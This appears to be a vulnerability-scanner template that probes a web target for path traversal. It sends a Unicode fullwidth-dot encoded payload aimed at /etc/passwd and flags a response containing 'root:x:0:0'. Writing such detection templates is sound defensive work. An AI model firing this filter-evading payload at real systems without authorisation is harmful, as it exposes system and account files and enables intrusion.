id: lfi2-011
name: 'Path traversal2 via file'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via file'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      file:
        - '%uff0e%uff0e/%uff0e%uff0e/etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
